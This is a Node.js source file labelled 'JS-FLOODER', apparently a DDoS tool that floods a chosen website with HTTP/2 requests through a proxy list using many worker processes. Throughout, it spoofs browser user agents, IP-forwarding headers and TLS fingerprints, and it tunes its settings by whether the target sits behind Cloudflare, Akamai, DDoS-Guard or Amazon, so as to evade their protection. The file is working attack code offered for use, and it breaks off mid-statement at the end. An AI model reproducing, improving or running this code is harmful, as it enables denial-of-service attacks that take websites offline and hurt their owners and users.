const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, cluster = require('cluster')
//random ua by thaiduong
const crypto = require('crypto');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const errorHandler = error => {
	console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

var parsed = url.parse(process.argv[2]);
const lookupPromise = util.promisify(dns.lookup);
let val 
let isp
let pro
async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log('ISP ', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
		 pro =[ 
			{'Methods' : ''},
		    {'Quic-Version' : '0x00000001'},
			
		]
		  val = { 'NEl': Math.random() < 0.5 ? JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}) : JSON.stringify({
	  "success_fraction":0,
      "report_to":Math.random() < 0.5 ? "cf-nel" : 'default',
      "max_age":604800}),
		  }
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
		pro = {'Strict-Transport-Security': 'max-age=31536000'}
           
	  }
    } else {
     return
    }
  } catch (error) {
    return
  }
}

const targetURL = parsed.host; 

getIPAndISP(targetURL);
const winarch = [
	"x86-16",
	"x86-16, IA32",
	"IA-32",
	"IA-32, Alpha, MIPS",
	"IA-32, Alpha, MIPS, PowerPC",
	"Itanium",
	"x86_64",
	"IA-32, x86-64",
	"IA-32, x86-64, ARM64",
	"x86-64, ARM64",
	"ARMv4, MIPS, SH-3",
	"ARMv4",
	"ARMv5",
	"ARMv7",
	"IA-32, x86-64, Itanium",
	"IA-32, x86-64, Itanium",
	"x86-64, Itanium",
	];
	
var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];

try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_128_GCM_SHA256',
     'ECDHE-ECDSA-AES128-GCM-SHA256',
     'ECDHE-ECDSA-CHACHA20-POLY1305'
		, ]
		const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
  const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
  const FAB = ['Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral',
  'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine',
  'Mirthful', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quintessential', 'Rambunctious',
  'Surreptitious', 'Tangible', 'Ubiquitous', 'Vicarious', 'Whimsical', 'Xenial',
  'Yonder', 'Zephyr', 'Allure', 'Benevolent', 'Cacophony', 'Dulcet', 'Enigmatic',
  'Fervor', 'Gregarious', 'Halcyon', 'Ineffable', 'Jubilant', 'Kaleidoscope',
  'Luminous', 'Mellifluous', 'Nefarious', 'Opulent', 'Prolific', 'Quixotic',
  'Resilient', 'Serenity', 'Tranquil', 'Unabashed', 'Voracious', 'Wanderlust', 'Xenophile', 'Yearning', 'Zestful'];

  var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
 var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];


controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7];
let query = process.argv[8];
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
	console.log('JS-FLOODER'.bgRed)
	console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood query(true/false)`.rainbow);
 console.log('default : query : true'.red);
	process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
if (cluster.isMaster) {
	console.clear()
	console.log(`success attack`.bgRed)
		, console.log(`flood`.yellow)
process.stdout.write("Loading: 10%\n");
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n");
}, time * 1000);
	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	if (input === 'flood') {
	const abu =	setInterval(function() {
			flood()
		}, 1);
	}else {
	setInterval(flood)
}
}

async function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval
	if (input === 'flood') {
	  interval = 1000;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function aString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
	const randstrsValue = randstr(25);
	
 	function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const a = getRandomInt(108,131);
const b = getRandomInt(108,128);
const c = getRandomInt(108,129);
const d = getRandomInt(108,131);
const e = getRandomInt(108,127);
var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
var architectures = {
  "Windows NT 10.0": `Win64; x64`,
  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`  ,
  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:${a}.0` : `Linux x86_64`
};



function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 


var uas =  `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36`
var ua1 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b}.0.0.0 Safari/537.36 Edg/${b}`
var ua2 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Safari/537.36 OPR/${c}`
var uass = `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:${d}.0) Gecko/20100101 Firefox/${d}`

var uasss = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${e}.0.0.0 Safari/537.36 Brave/${e}.0.0.0`
var ch_ua = `"\"Google Chrome\";v=\"${a}\", \"Chromium\";v=\"${a}\", \"Not:A-Brand\";v=\"99\""
`

let ch_ua_v;
    if (randomOS === "Windows NT 10.0") {
        ch_ua_v = `Windows`;
    }
else if (randomOS === "Macintosh") {
        ch_ua_v = `macOSX`;
    }
 else if (randomOS === "X11") {
        ch_ua_v = `Linux`;
    }


const ch_ua_ver = `${ch_ua_v}`;

	const rateHeaders = [,
		{ "cache-control": "private" },
		{ "Expect-CT": "99-OK" },
		];
		const rateHeaders2 = [
		{ "accept-char": "UTF-8" },
		{ "Geo-Location": "UNKNOWN" },
		{ "X-Forwarded-For": randIp },
		{ "Width": "1920" }, 
		];
		const rateHeaders3 = [
		{ "device-memory": "0.3" },
		{ "accept-language": 'en-US;q=0.8' },
		{ "X-requested-with": "XMLHttpRequest" },
		{ "Viewport-width": "1080" },
		];
		const rateHeaders4 = [
{ "Via": "1.1 " + parsed.host },
    {"dnt" : "1" },
{ "X-Vercel-Cache": randstr(15) },
{ "Alt-Svc": "http/1.1=http2." + parsed.host + "; ma=86400" },
{ "TK": "?" },
{ "X-Frame-Options": "deny" },
{ "X-ASP-NET": randstr(25) },
{ "te": "trailers" },
		{ "Maxw-Forwardsp": "5" },
		{ "pragma": "no-cache" },
		];
		const rhd = [
			{'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
			{'Nel': val},
			{'refererpap': generateRandomString(5,19)},
			{"cdn-loop": "cloudflare"}
		]
		const hd1 = [
			{'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
			{'accept-charset' : generateRandomString(5,10)},

		]
const rateHeaders5 = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
];
const rateHeaders6 = [
{ "upgrade-insecure-requests": "1" },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "origin": "https://" + parsed.host },
{ "pragma": "no-cache" },
{ "referer": "https://" + parsed.host + "/" },
];
const rateHeaders7 = [
{ "Refresh": "5" },
{ "X-Content-duration": randIp },
{ "HTTP2-Setting" : Math.random() < 0.5 ? 'token64' : 'token68'},
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];

function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
 var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];

var multi = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(15);
var duong = "cdn=" + generateRandomString(20) + "cloudflareismydick=" + generateRandomString(10);
   hd = {}
     header = {
		':authority' : parsed.host,
		':scheme': 'https',
		':path': parsed.path,
		':method': 'GET'
	 }
	header["priority"] = "u=0, 1";
	header["accept-encoding"] = 'gzip, br';
	header["sec-ch-ua-mobile"] = "?0";
	header["upgrade-insecure-requests"] = "1";
  header["sec-fetch-dest"] = "document";
 header["sec-fetch-mode"] = "navigate";
 header["sec-fetch-site"] = "none";
 header["sec-fetch-user"] = "1";
  header["sec-ch-ua"] = duong;
const brw = ['chrome','firefox','edge','macos','linux','opera']
let dynHeaders
let ci
let bruh 
async function rand() {
	var browser = brw[Math.floor(Math.random() * brw.length)]
	if (browser === 'chrome') {
    
	 dynHeaders = {
		
		
		...val,
		
        ...pro,
		...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
		...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
		...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
		...rhd[Math.floor(Math.random() * rhd.length)],
		...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
		...hd1[Math.floor(Math.random() * hd1.length)],
     		...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
		...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
		...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
                        "user-agent" : uas,
                        "sec-ch-ua-platform" : ch_ua_ver,
					  };
					}else if (browser === 'firefox'){
						
						dynHeaders = {
							
							...val,
                            ...pro,
							

							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
							...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
							...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
     		...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
		...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
		...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
                  "user-agent" : uass,
                        "sec-ch-ua-platform" : ch_ua_ver,
										  };
					}else if (browser === 'edge'){
						
						dynHeaders = {
							
							...val,
                            ...pro,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
							...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
     		...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
		...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
		...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
                  "user-agent" : ua1,
                        "sec-ch-ua-platform" : ch_ua_ver,
										  };
					} else if (browser === 'opera') {
						
						dynHeaders = {


							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...val,
							...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
                            ...pro,

							...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
							
							...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
                  "user-agent" : ua2,
                        "sec-ch-ua-platform" : ch_ua_ver,
										  };
					} else if (browser === 'linux') {
						dynHeaders = {
							     		...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
		...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
		...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
							
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...val,
							...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
                            ...pro,

										...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
											...hd1[Math.floor(Math.random() * hd1.length)],
							...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
							                  "user-agent" : uasss,
							                        "sec-ch-ua-platform" : ch_ua_ver,

										  };
					} else if (browser === 'macos') {
						dynHeaders = {
							
							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
							...val,
							...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
                            ...pro,
							     		...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
		...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
		...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],

							...rhd[Math.floor(Math.random() * rhd.length)],
							                  "user-agent" : ua1,
                        "sec-ch-ua-platform" : ch_ua_ver,
										  };
					} else {
						dynHeaders = {
							
							     		...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
		...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
		...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
							...val,
                            ...pro,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
							...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
							...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
							...hd1[Math.floor(Math.random() * hd1.length)],
							...rhd[Math.floor(Math.random() * rhd.length)],
							
                        "sec-ch-ua-platform" : ch_ua_ver,
                  "user-agent" : uasss,
										  };
					}
					return dynHeaders
	
}
rand()
	const agent = await new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
			, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
		, }
	, };
	connection = await http.request(Optionsreq, (res) => {});
 connection.on('error', (err) => {
 
 if (err) return
});
 connection.on('timeout', async () => {
		return
		});
	const TLSOPTION = {
		ciphers: cipper
		, secureProtocol:['TLSv1_3_method'] 
		, echdCurve: Math.random() < 0.5 ? "X25519" : 'auto'
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
	, };

	async function createCustomTLSSocket(parsed, socket) {
		const tlsSocket = await tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		return tlsSocket;
	}
	function generateJA3Fingerprint(socket) {
		const cipherInfo = socket.getCipher();
		const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  console.error('Cipher info is not available. TLS handshake may not have completed.');
		  return null;
		}
	  
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
	  }	  
	  
 
	 
	connection.on('connect', async function(res, socket) {

		const tlsSocket = await createCustomTLSSocket(parsed, socket);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        hd['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
	const client = await http2.connect(parsed.href, {
			createConnection: () => tlsSocket
			, settings: {  
       enablePush: false,      
			},
       rejectUnauthorized: false,
			 enableConnectProtocol: false,
			 allowHTTP1: true
		});
   const streams = []
		client.on('stream', (stream, headers) => {
		if (isp === 'Akamai Technologies, Inc.' ) {
			stream.priority = Math.random() < 0.5 ? 0 : 1; 
			stream.connection.localSettings[http2.constants.SETTINGS_HEADER_TABLE_SIZE(0x01)] = 4096;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] =16384;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 32768;
			
		} else if (isp === 'Cloudflare, Inc.') {
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x04)] = 16384;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x05)] = 65536;
			
			
		} else if (isp === 'Ddos-guard LTD') {
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 8;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
			
			
		} else if (isp === 'Amazon.com, Inc.') {
			stream.priority = Math.random() < 0.5 ? 0 : 1; 
			stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
			stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
		} else {
		    stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
		    stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
		}
    streams.push(stream);
	})

		client.on("connect", async () => {
			let y = 0;
			while(y < 7){
				re = client.request({
					weight: 42, 
					parent:1,
					exclusive: false,
				})
				let get 
				if (y === 1) {
                       get = 201
				}else if (y === 2){
					get = 101
				}else{
					get = 1
				}
				re.priority({
					exclusive: false,
					weight: get,
				})
			y++
			}
			setInterval(async () => {
				function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
				  const options = shuffleObject({
               ...hd,
               ...header,
					...dynHeaders,
					"x-https": "on",
					"x-forwarded-proto": "https",
              ...multi,
				  })
             //console.log(options)
		  	for (let i = 0; i < rps; i++) {
  const request = await client.request(options);
  request.priority({
	exclusive: false,
	weight: 220,
  })
  	request.end()  
  				}
			}, interval);
		});
		if (streams.length > 0) {
  const streamToReset = streams[0];

